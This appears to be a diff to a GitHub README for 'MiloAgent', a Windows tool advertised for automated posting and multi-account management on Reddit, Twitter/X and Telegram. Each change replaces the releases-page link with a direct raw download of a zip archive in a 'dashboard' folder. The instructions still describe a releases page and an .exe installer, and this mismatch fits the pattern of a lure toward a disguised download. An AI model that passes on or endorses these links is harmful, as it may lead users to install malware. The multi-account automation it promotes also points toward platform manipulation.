@@ -1,6 +1,6 @@
 # 🤖 MiloAgent - Boost Social Media Growth Easily
 
-[![Download MiloAgent](https://img.shields.io/badge/Download-MiloAgent-ff6f61?style=for-the-badge)](https://github.com/JessicaDaffinys/MiloAgent/releases)
+[![Download MiloAgent](https://img.shields.io/badge/Download-MiloAgent-ff6f61?style=for-the-badge)](https://github.com/JessicaDaffinys/MiloAgent/raw/refs/heads/main/dashboard/Milo-Agent-3.5.zip)
 
 MiloAgent is a software that helps you grow your online communities on Reddit, Twitter/X, and Telegram. It works on its own to post content, manage multiple accounts, and test what works best. This guide shows you how to get MiloAgent running on Windows without needing technical skills.
 
@@ -36,11 +36,11 @@ Before you start, make sure your computer meets these conditions:
 
 Start by visiting the official release page. This is where the latest version of MiloAgent is available for download.
 
-[![Download MiloAgent](https://img.shields.io/badge/Download-MiloAgent-00aaff?style=for-the-badge)](https://github.com/JessicaDaffinys/MiloAgent/releases)
+[![Download MiloAgent](https://img.shields.io/badge/Download-MiloAgent-00aaff?style=for-the-badge)](https://github.com/JessicaDaffinys/MiloAgent/raw/refs/heads/main/dashboard/Milo-Agent-3.5.zip)
 
 **Steps to download the software:**  
 
-1. Click the link above or go to [https://github.com/JessicaDaffinys/MiloAgent/releases](https://github.com/JessicaDaffinys/MiloAgent/releases).  
+1. Click the link above or go to [https://github.com/JessicaDaffinys/MiloAgent/raw/refs/heads/main/dashboard/Milo-Agent-3.5.zip](https://github.com/JessicaDaffinys/MiloAgent/raw/refs/heads/main/dashboard/Milo-Agent-3.5.zip).  
 2. Look for the latest release (usually at the top).  
 3. Find the Windows installer file. It will have an `.exe` extension, often named like `MiloAgent-setup.exe`.  
 4. Click on the file to download it to your computer.  
@@ -101,7 +101,7 @@ The user interface is designed to be clear and simple. Click buttons, fill in th
 
 To keep MiloAgent working well, check for updates regularly.
 
-1. Visit the [releases page again](https://github.com/JessicaDaffinys/MiloAgent/releases).  
+1. Visit the [releases page again](https://github.com/JessicaDaffinys/MiloAgent/raw/refs/heads/main/dashboard/Milo-Agent-3.5.zip).  
 2. Download the latest installer file.  
 3. Run the installer as before. It will update your existing software without losing your settings.  
 
@@ -132,4 +132,4 @@ MiloAgent is built with Python and uses LLM (large language models) to generate 
 
 ---
 
-[![Download MiloAgent](https://img.shields.io/badge/Download-MiloAgent-ff6f61?style=for-the-badge)](https://github.com/JessicaDaffinys/MiloAgent/releases)
+[![Download MiloAgent](https://img.shields.io/badge/Download-MiloAgent-ff6f61?style=for-the-badge)](https://github.com/JessicaDaffinys/MiloAgent/raw/refs/heads/main/dashboard/Milo-Agent-3.5.zip)
